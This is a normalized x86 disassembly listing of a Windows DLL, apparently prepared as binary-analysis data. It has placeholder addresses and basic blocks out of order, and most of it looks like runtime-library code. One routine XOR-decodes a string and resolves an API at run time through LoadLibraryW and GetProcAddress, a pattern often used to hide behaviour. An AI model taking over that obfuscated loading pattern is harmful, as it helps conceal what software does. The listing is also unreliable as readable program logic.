cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea edx [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x60 ]
push eax
call sub_10030239
mov edi [ ebp - 0x54 ]
push [ ebp - 0x6c ]
mov [ edi ] al
movsx eax al
push eax
push r--data
call sub_100783e0
add esp 0x14
test eax eax
je r-xdata
mov ecx esi
call sub_1001e1bc
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
push 0x1
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] 0x0
call sub_1004b830
mov eax [ ebp - 0x64 ]
push [ ebp - 0x5c ]
add eax 0x1f
mov ecx esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x70 ] eax
call sub_10060ea7
test al al
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x50 ] ebx
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x54 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov [ ebp - 0x50 ] 0x8
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
xor ebx ebx
push ebx
push 0x78
call sub_1005e05a
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + ebx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp edi [ ebp - 0x70 ]
jae r-xdata
cmp [ edi ] 0x30
je r-xdata
cmp [ ebp - 0x50 ] ebx
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x54 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_1001c5c0
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1001c5c0
mov eax [ ebp - 0x50 ]
call sub_10019c00
retn
mov eax [ ebp - 0x54 ]
inc [ ebp - 0x54 ]
mov [ eax ] 0x30
jmp r-xdata
dec ebx
je r-xdata
test ebx ebx
je r-xdata
mov edi [ ebp - 0x68 ]
test di di
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
jae r-xdata
inc edi
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x49 ] 0x1
mov ecx esi
mov [ ebp - 0x50 ] 0x10
mov [ ebp - 0x58 ] bl
call sub_1001e1ec
jmp r-xdata
cmp [ ebp - 0x50 ] 0x10
jne r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x58
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
test ebx ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax + ebx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + ebx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + ebx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x6 ] di
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov ecx esi
call sub_1001e1ec
push [ ebp - 0x5c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x0
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10050f80
inc ebx
inc [ eax + ebx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
sub_100111ac
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_100111e0
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push esi
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
push 0x0
push ebx
call eax
mov ecx [ ebp - 0x4 ]
add esp 0xc
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ r--data ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff97
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0xa
jb r-xdata
lea ecx [ ebp - 0x24 ]
xor eax eax
push ecx
mov [ ebp - 0x10 ] ax
call [ LoadLibraryW@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
lea edi [ ebp - 0xc ]
mov eax 0x6
call sub_10064fb0
mov edx edi
push edx
push esi
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
pop edi
test eax eax
jne r-xdata
lea eax [ esi + 0x1 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_100112ab
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_100112ed
push 0x10
mov eax sub_1007e22c
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_100067d1
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0xc ] ebx
ja r-xdata
mov ecx [ ebp + 0xc ]
call sub_1001c4b0
mov eax [ esi + 0x8 ]
mov edi ebx
cmp [ eax + edi * 4 ] 0x0
je r-xdata
lea edi [ ebx + 0x1 ]
cmp edi 0x28
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax + edi * 4 ] ecx
lea ecx [ ebp - 0x10 ]
call sub_1002470e
call sub_1001a1b3
retn
mov ecx [ eax + edi * 4 ]
call sub_10049900
test eax eax
je r-xdata
mov eax edi
shl eax 0x2
push eax
push [ esi + 0x8 ]
call sub_10020709
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x28
pop edi
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
mov [ esi + 0x8 ] eax
jmp r-xdata
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
cmp [ esi + 0xc ] edi
jb r-xdata
push edi
lea ecx [ ebp - 0x1c ]
call sub_10011e8f
push r--data
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x1c ] esi
call sub_1002050e
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov [ ebp + 0x8 ] r--data
call sub_1000a4a8
push sub_1008339a
mov [ rw-data ] esi
call sub_10025945
pop ecx
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
and [ ecx + eax * 4 ] 0x0
inc [ esi + 0xc ]
sub_10011407
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
test edi edi
jne r-xdata
push esi
call sub_10064c8e
push 0x214
push 0x1
call sub_10025450
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
xor eax eax
jmp r-xdata
push esi
call sub_10020a90
pop ecx
test ebx ebx
je r-xdata
call sub_10044fed
push [ eax + 0x6c ]
push esi
call sub_1000a5ee
mov eax [ ebp + 0x14 ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi + 0x58 ] eax
mov eax [ ebp + 0x1c ]
pop ecx
pop ecx
mov [ esi + 0x54 ] edi
test eax eax
jne r-xdata
pop edi
pop ebx
pop ebp
retn
xor eax eax
push ebx
call sub_100249b4
pop ecx
push eax
push [ ebp + 0x18 ]
push esi
push sub_10078168
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateThread@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp + 0x10 ]
pop esi
call [ GetLastError@IAT ]
mov ebx eax
sub_100114b0
push ebp
mov ebp esp
sub esp 0x24
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
mov al 0x38
xor [ ebp + 0x8 ] al
xor [ ebp + 0x9 ] al
xor [ ebp + 0xa ] al
xor [ ebp + 0xb ] al
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov edx [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
push ecx
mov [ ebp - 0x24 ] 0x8
mov [ ebp - 0x4 ] edx
call [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
mov esp ebp
pop ebp
retn 0x18
sub_1001150f
mov edi edi
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
add edi 0x14
push edi
mov [ ebp - 0x30 ] ecx
mov ecx [ ebp + 0x1c ]
push 0x0
push 0x30
mov [ ebp - 0x3c ] ecx
call sub_1005e05a
add esp 0xc
push [ ebp - 0x30 ]
movzx eax ax
mov ecx esi
mov [ ebp - 0x2c ] eax
lea ebx [ ebp - 0x24 ]
call sub_10060ea7
test al al
jne r-xdata
mov edi [ ebp - 0x30 ]
push edi
mov ecx esi
mov [ ebp - 0x25 ] 0x0
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push edi
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
push edi
push 0x0
push 0x2b
mov [ ebp - 0x34 ] eax
call sub_1005e05a
add esp 0xc
cmp [ ebp - 0x34 ] ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
mov ax [ ebp - 0x2c ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] 0x2b
jmp r-xdata
mov ax [ ebp - 0x2c ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001e1bc
lea eax [ ebp - 0x38 ]
push eax
push 0xa
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x24 ]
xor edi edi
push eax
mov [ ebx ] 0x0
mov [ ebp - 0x38 ] edi
call sub_100276d6
add esp 0x10
push [ ebp - 0x30 ]
mov ecx esi
mov ebx eax
call sub_10060ea7
test al al
je r-xdata
lea ebx [ ebp - 0x24 ]
cmp [ ebp - 0x25 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x25 ] 0x1
call sub_1001e1ec
push edi
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
movzx eax [ esi + 0x6 ]
push edi
push 0x0
push 0x2d
mov [ ebp - 0x34 ] eax
call sub_1005e05a
add esp 0xc
cmp [ ebp - 0x34 ] ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov ecx esi
lea ebx [ ebp - 0x23 ]
call sub_1001e1ec
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
inc edi
mov [ ebx ] 0x30
inc ebx
jmp r-xdata
mov [ ebp - 0x24 ] 0x2d
movzx eax [ ebp - 0x2c ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001e1bc
or edi 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp ebx [ ebp + 0x14 ]
jl r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x2c ]
add al 0x30
mov [ ebx ] al
lea eax [ ebp - 0x5 ]
cmp ebx eax
jae r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp + 0x18 ] ebx
jl r-xdata
mov ecx esi
mov [ ebp - 0x25 ] 0x1
call sub_1001e1ec
inc ebx
mov eax [ ebp - 0x3c ]
mov [ eax ] ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
sub_10011700
push ebp
mov ebp esp
sub esp 0x8
mov edx [ rw-data ]
mov eax [ edx + 0x10 ]
push ebx
push esi
lea esi [ edx + 0xc ]
push edi
mov edi [ edx + 0x8 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] 0x0
cmp ecx eax
jae r-xdata
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
lea ebx [ ebp - 0x8 ]
cmp ecx ebx
ja r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_10016580
mov edx [ rw-data ]
mov edi ebx
sub edi ecx
sar edi 0x3
cmp eax [ esi + 0x8 ]
jne r-xdata
add [ esi + 0x4 ] 0x8
mov eax [ edx + 0x8 ]
pop edi
lea ecx [ eax + 0x1 ]
pop esi
mov [ edx + 0x8 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_10016580
mov edx [ rw-data ]
mov ecx [ esi ]
mov ebx [ ecx + edi * 8 ]
mov [ eax ] ebx
mov ecx [ ecx + edi * 8 + 0x4 ]
jmp r-xdata
mov [ eax + 0x4 ] ecx
sub_100117a0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10009180
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_1005dcc0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_1000fab0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10011860
push ebp
mov ebp esp
sub esp 0xc
push esi
push 0x18
mov esi ecx
call sub_1005ac7e
xor edx edx
add esp 0x4
cmp eax edx
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] edx
call sub_10052185
push r--data
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0xc ] r--data
call sub_1002050e
int3
mov ecx [ esi + 0x4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x8 ] ecx
lea ecx [ eax + 0xc ]
mov [ eax + 0x14 ] dx
cmp ecx edx
je r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
mov esi [ ebp + 0x8 ]
mov edx [ esi ]
mov [ ecx ] edx
mov dl [ esi + 0x4 ]
mov [ ecx + 0x4 ] dl
sub_100118d0
push esi
mov esi ecx
mov eax [ esi + 0x98 ]
test eax eax
je r-xdata
pop esi
retn
mov ecx [ esi + 0x9c ]
push 0x8000
push ecx
push eax
call [ VirtualFree@IAT ]
mov [ esi + 0x98 ] 0x0
mov [ esi + 0x9c ] 0x0
sub_10011906
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10040cfd
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_100119a3
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_100119d5
push 0x20
mov eax sub_1007eebd
call sub_10007703
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_10022155
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1004b542
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_1004dbe5
mov eax edi
call sub_10019c00
retn 0x24
sub_10011a54
push 0x14
push r--data
call sub_10078b50
and [ ebp - 0x20 ] 0x0
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_10044fed
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_1002635d
or [ esi + 0x70 ] 0x10
and [ ebp - 0x4 ] 0x0
xor edi edi
inc edi
push edi
push 0xd8
call sub_10025450
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x24 ] ebx
test ebx ebx
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10011bc3
mov eax [ ebp - 0x20 ]
push 0xc
call sub_1003938d
pop ecx
mov [ ebp - 0x4 ] edi
mov ecx [ esi + 0x6c ]
mov eax ebx
call sub_10079dba
and [ ebp - 0x4 ] 0x0
call sub_10011b86
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx ebx
call sub_1007a27f
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
call sub_10078b95
retn
push ebx
call sub_10015308
push ebx
call sub_1000878a
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0xc
call sub_1003938d
pop ecx
mov [ ebp - 0x4 ] 0x2
lea edi [ esi + 0x6c ]
push ebx
push edi
call sub_100246c1
push ebx
call sub_10015308
add esp 0xc
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_10078c40
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10011b92
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] edi
push [ edi ]
push rw-data
call sub_100246c1
pop ecx
pop ecx
mov eax [ rw-data ]
mov ecx [ eax + 0xbc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rw-data ] ecx
mov eax [ eax + 0xac ]
mov [ rw-data ] eax
sub_10011bc8
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_10079b57
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_10079963
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_10078970
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_10079934
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_100799c7
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_10078970
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_10079934
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_10011db1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp ecx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
jmp r-xdata
push [ eax + 0x4 ]
push ecx
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push 0x1001
push [ eax + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100264a3
add esp 0x20
cmp eax ebx
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10002e61
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10011e8f
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_1002900a
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10011eb4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_10061855
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_10003602
test eax eax
movsx eax [ esi ]
push eax
call sub_10061855
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
add esi 0x2
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10011f28
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
leave
retn
cmp ecx 0x7fffffff
ja r-xdata
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10052185
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_1002050e
lea eax [ ecx + ecx ]
push eax
call sub_1005ac7e
pop ecx
test eax eax
jne r-xdata
sub_10011f80
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx eax
sub ecx ebx
sar ecx 0x2
mov eax ecx
cdq
sub eax edx
push edi
mov edi eax
sar edi 0x1
mov [ ebp - 0x8 ] ecx
test edi edi
jle r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea esi [ edi + edi + 0x2 ]
jmp r-xdata
mov eax [ ebx + edi * 4 - 0x4 ]
dec edi
sub esi 0x2
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] edi
cmp esi ecx
jge r-xdata
jne r-xdata
mov ecx [ ebx + esi * 4 - 0x4 ]
mov edx [ ebx + esi * 4 ]
push ecx
push edx
